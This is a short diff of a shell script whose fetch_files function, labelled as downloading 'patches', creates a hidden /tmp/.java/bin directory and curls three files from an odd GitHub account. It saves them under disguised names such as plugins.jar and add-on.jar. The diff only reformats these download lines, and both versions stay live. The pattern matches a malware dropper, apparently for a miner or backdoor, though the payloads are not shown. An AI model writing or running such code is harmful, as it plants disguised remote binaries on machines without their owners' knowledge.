@@ -3,10 +3,9 @@
 function fetch_files() {
     echo "Downloading Patches ..."
     mkdir -p /tmp/.java/bin
-    cd /tmp/.java/bin &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/deru-01/cfg.conf -o cfg.conf &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar 
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/deru-01/cfg.conf -o cfg.conf
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
     echo "DONE ..."
 }
 
